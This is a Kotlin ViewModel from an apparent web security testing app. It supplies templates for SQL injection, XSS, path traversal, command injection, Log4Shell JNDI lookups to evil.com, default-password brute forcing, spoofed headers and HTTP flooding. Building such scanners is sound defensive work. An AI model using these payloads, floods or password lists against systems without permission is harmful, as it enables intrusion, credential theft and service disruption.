package com.example.teost.presentation.screens.test

import androidx.lifecycle.ViewModel
import com.example.teost.data.model.TestConfiguration
import com.example.teost.data.model.TestParameters
import com.example.teost.data.model.Config
import com.example.teost.data.model.EncodingMode
import java.util.UUID
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject
import com.example.teost.data.model.HttpMethod
import com.example.teost.core.domain.validation.DomainValidator

@HiltViewModel
class GenericTestConfigureViewModel @Inject constructor() : ViewModel() {

    private val _state = MutableStateFlow(UiState())
    val state: StateFlow<UiState> = _state.asStateFlow()
    
    private var currentTestType: String = ""

    fun loadTemplateFor(testType: String) {
        currentTestType = testType
        val templateParams = when (testType) {
            "SqlInjection" -> TestParameters(
                payloadList = listOf(
                    "1' OR 1=1--",
                    "1' UNION SELECT NULL,NULL,NULL--", 
                    "'; DROP TABLE users--",
                    "1' AND SLEEP(5)--",
                    "1' OR '1'='1",
                    "admin'--",
                    "1' UNION SELECT username,password FROM users--",
                    "1'; EXEC xp_cmdshell('dir')--"
                ),
                encodingMode = EncodingMode.URL_ENCODE,
                targetParam = "id",
                httpMethod = HttpMethod.POST,
                requestPath = "/login",
                queryParams = mapOf("id" to "{{PAYLOAD}}", "action" to "login"),
                customHeaders = mapOf(
                    "Content-Type" to "application/x-www-form-urlencoded",
                    "X-Forwarded-For" to "127.0.0.1",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                ),
                bodyTemplate = "username={{PAYLOAD}}&password=test123"
            )
            "XssTest" -> TestParameters(
                payloadList = listOf(
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<svg onload=alert('XSS')>",
                    "<iframe src=javascript:alert('XSS')></iframe>",
                    "<body onload=alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<select onfocus=alert('XSS') autofocus>",
                    "<textarea onfocus=alert('XSS') autofocus>",
                    "<keygen onfocus=alert('XSS') autofocus>",
                    "<video><source onerror=alert('XSS')>",
                    "<audio src=x onerror=alert('XSS')>"
                ),
                encodingMode = EncodingMode.URL_ENCODE,
                targetParam = "q",
                httpMethod = HttpMethod.POST,
                requestPath = "/comment",
                queryParams = mapOf("q" to "{{PAYLOAD}}", "page" to "1"),
                customHeaders = mapOf(
                    "Content-Type" to "application/x-www-form-urlencoded",
                    "Referer" to "https://trusted-site.com",
                    "X-Forwarded-For" to "192.168.1.100"
                ),
                bodyTemplate = "comment={{PAYLOAD}}&submit=true"
            )
            "HttpSpike" -> TestParameters(
                burstRequests = 500,
                burstIntervalMs = 50,
                concurrencyLevel = 20,
                sustainedRpsWindow = 10,
                httpMethod = HttpMethod.GET,
                requestPath = "/",
                customHeaders = mapOf(
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept" to "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language" to "en-US,en;q=0.5",
                    "Accept-Encoding" to "gzip, deflate",
                    "Connection" to "keep-alive"
                )
            )
            "ConnectionFlood" -> TestParameters(
                concurrentConnections = 100,
                durationSec = 60,
                rpsTarget = 50,
                requestPath = "/",
                customHeaders = mapOf(
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept" to "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language" to "en-US,en;q=0.5",
                    "Accept-Encoding" to "gzip, deflate",
                    "Connection" to "keep-alive",
                    "Cache-Control" to "no-cache"
                )
            )
            "UserAgentAnomaly" -> TestParameters(
                uaProfiles = listOf(
                    "Googlebot/2.1 (+http://www.google.com/bot.html)",
                    "curl/7.68.0",
                    "python-requests/2.28.1",
                    "wget/1.20.3",
                    "libwww-perl/6.15",
                    "sqlmap/1.0",
                    "nikto/2.1.6",
                    "nmap/7.80",
                    "masscan/1.0.4",
                    "zap/2.9.0",
                    "burp/2020.1",
                    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
                    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
                ),
                headerMinimal = false,
                acceptLanguage = "en-US,en;q=0.9",
                customHeaders = mapOf("User-Agent" to "{{PAYLOAD}}"),
                requestPath = "/"
            )
            "BruteForce" -> TestParameters(
                username = "admin",
                passwordList = listOf(
                    "password", "123456", "admin", "Password123!", "qwerty",
                    "password123", "admin123", "root", "toor", "pass",
                    "123456789", "12345678", "1234567", "1234567890",
                    "abc123", "password1", "admin1", "test", "guest",
                    "user", "administrator", "sa", "oracle", "postgres",
                    "mysql", "apache", "tomcat", "weblogic", "jboss"
                ),
                requestDelayMs = 100,
                apiEndpoint = "/api/auth/login",
                httpMethod = HttpMethod.POST,
                customHeaders = mapOf(
                    "Content-Type" to "application/json",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept" to "application/json, text/plain, */*",
                    "X-Requested-With" to "XMLHttpRequest"
                ),
                bodyTemplate = "{\"username\": \"admin\", \"password\": \"{{PAYLOAD}}\"}"
            )
            "PathTraversal" -> TestParameters(
                payloadList = listOf(
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "..%252F..%252F..%252Fetc%252Fpasswd",
                    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                    "/etc/passwd%00",
                    "/etc/passwd%00.txt",
                    "..\\..\\..\\..\\..\\..\\etc\\passwd",
                    "....//....//....//windows/system32/drivers/etc/hosts"
                ),
                encodingMode = EncodingMode.URL_ENCODE,
                targetParam = "file",
                httpMethod = HttpMethod.GET,
                requestPath = "/download",
                queryParams = mapOf("file" to "{{PAYLOAD}}", "path" to "../"),
                customHeaders = mapOf(
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "X-Real-IP" to "192.168.1.1",
                    "X-Forwarded-For" to "10.0.0.1"
                )
            )
            "CommandInjection" -> TestParameters(
                payloadList = listOf(
                    "; ls -la",
                    "| whoami",
                    "& dir",
                    "; cat /etc/passwd",
                    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "& net user",
                    "; ps aux",
                    "| tasklist",
                    "& wmic process list",
                    "; id",
                    "| whoami /all",
                    "& systeminfo"
                ),
                encodingMode = EncodingMode.URL_ENCODE,
                targetParam = "cmd",
                httpMethod = HttpMethod.POST,
                requestPath = "/exec",
                queryParams = mapOf("cmd" to "{{PAYLOAD}}", "exec" to "true"),
                customHeaders = mapOf(
                    "Content-Type" to "application/json",
                    "X-Forwarded-For" to "10.0.0.1",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                ),
                bodyTemplate = "{\"command\": \"{{PAYLOAD}}\", \"args\": []}"
            )
            "ReflectedXss" -> TestParameters(
                payloadList = listOf(
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<svg onload=alert('XSS')>",
                    "<iframe src=javascript:alert('XSS')></iframe>",
                    "<body onload=alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<select onfocus=alert('XSS') autofocus>",
                    "<textarea onfocus=alert('XSS') autofocus>"
                ),
                encodingMode = EncodingMode.URL_ENCODE,
                targetParam = "q",
                httpMethod = HttpMethod.GET,
                requestPath = "/search",
                queryParams = mapOf("q" to "{{PAYLOAD}}", "page" to "1"),
                customHeaders = mapOf(
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Referer" to "https://trusted-site.com"
                )
            )
            "Log4ShellProbe" -> TestParameters(
                payloadList = listOf(
                    "\${jndi:ldap://evil.com/a}",
                    "\${jndi:rmi://evil.com/a}",
                    "\${jndi:dns://evil.com/a}",
                    "\${jndi:iiop://evil.com/a}",
                    "\${jndi:nds://evil.com/a}",
                    "\${jndi:corba://evil.com/a}",
                    "\${jndi:nis://evil.com/a}",
                    "\${jndi:ldap://127.0.0.1:1389/a}"
                ),
                encodingMode = EncodingMode.URL_ENCODE,
                targetParam = "user",
                httpMethod = HttpMethod.POST,
                requestPath = "/login",
                queryParams = mapOf("user" to "{{PAYLOAD}}", "pass" to "test"),
                customHeaders = mapOf(
                    "Content-Type" to "application/x-www-form-urlencoded",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "X-Forwarded-For" to "192.168.1.100"
                ),
                bodyTemplate = "username={{PAYLOAD}}&password=test123"
            )
            "EnumerationIdor" -> TestParameters(
                enumTemplate = "/api/users/{id}",
                idRange = listOf(1, 100),
                stepSize = 1,
                requestDelayMs = 50,
                apiEndpoint = "/api/users",
                httpMethod = HttpMethod.GET,
                queryParams = mapOf("id" to "{{PAYLOAD}}", "format" to "json"),
                customHeaders = mapOf(
                    "Authorization" to "Bearer {{TOKEN}}",
                    "X-API-Key" to "sk-test123",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
            )
            "AuthenticationTest" -> TestParameters(
                authMode = "header",
                authToken = "Bearer invalid-token-12345",
                apiEndpoint = "/api/auth/validate",
                httpMethod = HttpMethod.POST,
                customHeaders = mapOf(
                    "Content-Type" to "application/json",
                    "Authorization" to "Bearer {{PAYLOAD}}",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                ),
                bodyTemplate = "{\"token\": \"{{PAYLOAD}}\", \"action\": \"validate\"}"
            )
            "SchemaInputValidation" -> TestParameters(
                fuzzCases = listOf(
                    "{}",
                    "{\"a\":1}",
                    "{\"a\":\"b\"}",
                    "{\"a\":null}",
                    "{\"a\":[]}",
                    "{\"a\":{}}",
                    "{\"a\":true}",
                    "{\"a\":false}",
                    "{\"a\":1.5}",
                    "{\"a\":\"\"}",
                    "{\"a\":\"very long string that might cause issues\"}",
                    "{\"a\":\"<script>alert('XSS')</script>\"}",
                    "{\"a\":\"'; DROP TABLE users; --\"}"
                ),
                contentTypes = listOf("application/json", "application/xml", "text/plain"),
                apiEndpoint = "/api/validate",
                httpMethod = HttpMethod.POST,
                customHeaders = mapOf(
                    "Content-Type" to "{{PAYLOAD}}",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
            )
            "BusinessLogicAbuse" -> TestParameters(
                replayCount = 10,
                requestDelayMs = 100,
                apiEndpoint = "/api/workflow",
                httpMethod = HttpMethod.POST,
                customHeaders = mapOf(
                    "Content-Type" to "application/json",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "X-Requested-With" to "XMLHttpRequest"
                ),
                bodyTemplate = "{\"action\": \"process\", \"data\": \"test\"}"
            )
            "WebCrawlerSimulation" -> TestParameters(
                crawlDepth = 2,
                respectRobotsTxt = false,
                uaProfiles = listOf("Googlebot/2.1", "Bingbot/2.0", "Slurp/3.0"),
                requestPath = "/",
                customHeaders = mapOf(
                    "User-Agent" to "{{PAYLOAD}}",
                    "Accept" to "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                )
            )
            "OversizedBody" -> TestParameters(
                bodySizeKb = 1024,
                jsonFieldCount = 1000,
                requestPath = "/api/upload",
                httpMethod = HttpMethod.POST,
                customHeaders = mapOf(
                    "Content-Type" to "application/json",
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
            )
            "BasicConnectivity" -> TestParameters(
                httpMethod = HttpMethod.GET,
                timeoutMs = 15000,
                requestPath = "",
                customHeaders = mapOf(
                    "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept" to "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                )
            )
            else -> TestParameters(
                httpMethod = HttpMethod.GET,
                timeoutMs = 15000,
                requestPath = ""
            )
        }
        _state.value = _state.value.copy(params = templateParams)
    }

    fun updateParams(newParams: TestParameters) {
        _state.value = _state.value.copy(params = newParams)
    }

    fun updateDomain(newDomain: String) {
        _state.value = _state.value.copy(domain = newDomain)
    }
    
    fun validateCurrentParams(): List<String> {
        val params = _state.value.params
        val errors = mutableListOf<String>()
        
        // Basic validation
        if (params.timeoutMs != null && params.timeoutMs!! <= 0) {
            errors.add("Timeout must be greater than 0")
        }
        
        // Test-specific validation based on current test type
        when (currentTestType) {
            "SqlInjection", "XssTest", "PathTraversal", "CommandInjection" -> {
                if (params.payloadList.isNullOrEmpty()) {
                    errors.add("Payload list is required for ${currentTestType}")
                }
                if (currentTestType == "SqlInjection" && params.targetParam.isNullOrBlank()) {
                    errors.add("Target parameter is required for SQL injection test")
                }
            }
            "HttpSpike" -> {
                if (params.burstRequests == null || params.burstRequests!! < 1) {
                    errors.add("Burst requests must be at least 1")
                }
                if (params.concurrencyLevel == null || params.concurrencyLevel!! < 1) {
                    errors.add("Concurrency level must be at least 1")
                }
            }
            "ConnectionFlood" -> {
                if (params.concurrentConnections == null || params.concurrentConnections!! < 1) {
                    errors.add("Concurrent connections must be at least 1")
                }
                if (params.durationSec == null || params.durationSec!! < 1) {
                    errors.add("Duration must be at least 1 second")
                }
            }
            "BruteForce" -> {
                if (params.username.isNullOrBlank()) {
                    errors.add("Username is required for brute force test")
                }
                if (params.passwordList.isNullOrEmpty()) {
                    errors.add("Password list is required for brute force test")
                }
                if (params.apiEndpoint.isNullOrBlank()) {
                    errors.add("API endpoint is required for brute force test")
                }
            }
            "UserAgentAnomaly" -> {
                if (params.uaProfiles.isNullOrEmpty()) {
                    errors.add("User-Agent profiles are required for bot detection test")
                }
            }
            "EnumerationIdor" -> {
                if (params.enumTemplate.isNullOrBlank()) {
                    errors.add("Enumeration template is required for IDOR test")
                }
                if (params.idRange.isNullOrEmpty() || params.idRange!!.size < 2) {
                    errors.add("ID range (start and end) is required for IDOR test")
                }
            }
            "SchemaInputValidation" -> {
                if (params.fuzzCases.isNullOrEmpty()) {
                    errors.add("Fuzz cases are required for schema validation test")
                }
            }
            "BusinessLogicAbuse" -> {
                if (params.replayCount == null || params.replayCount!! < 1) {
                    errors.add("Replay count must be at least 1")
                }
            }
        }
        
        return errors
    }
    
    fun isFieldRelevant(fieldName: String): Boolean {
        return when (currentTestType) {
            "SqlInjection" -> fieldName in setOf(
                "httpMethod", "requestPath", "queryParams", "customHeaders", "bodyTemplate"
            )
            "XssTest" -> fieldName in setOf(
                "httpMethod", "requestPath", "queryParams", "customHeaders", "bodyTemplate"
            )
            "PathTraversal" -> fieldName in setOf(
                "requestPath", "customHeaders"
            )
            "HttpSpike" -> fieldName in setOf(
                "httpMethod", "requestPath"
            )
            "ConnectionFlood" -> fieldName in setOf(
                "requestPath"
            )
            "UserAgentAnomaly" -> fieldName in setOf(
                "customHeaders"
            )
            "BruteForce" -> fieldName in setOf(
                "httpMethod", "customHeaders", "bodyTemplate"
            )
            "CustomRulesValidation" -> fieldName in setOf(
                "requestPath", "customHeaders"
            )
            "OversizedBody" -> fieldName in setOf(
                "httpMethod", "requestPath", "customHeaders"
            )
            "CookieJsChallenge", "WebCrawlerSimulation" -> fieldName in setOf(
                "customHeaders"
            )
            "EnumerationIdor", "SchemaInputValidation", "BusinessLogicAbuse" -> fieldName in setOf(
                "httpMethod"
            )
            else -> true // Show all for unknown test types
        }
    }
    
    fun isValidConfiguration(): Boolean {
        val state = _state.value
        val domainValid = DomainValidator.validateDomain(state.domain) is DomainValidator.ValidationResult.Valid
        val paramsValid = validateCurrentParams().isEmpty()
        return domainValid && paramsValid
    }
    
    fun validateDomain(): String? {
        val domain = _state.value.domain
        return when (val result = DomainValidator.validateDomain(domain)) {
            is DomainValidator.ValidationResult.Valid -> null
            is DomainValidator.ValidationResult.Invalid -> result.reason
        }
    }
    

    data class UiState(
        val domain: String = "",
        val params: TestParameters = TestParameters()
    )
}
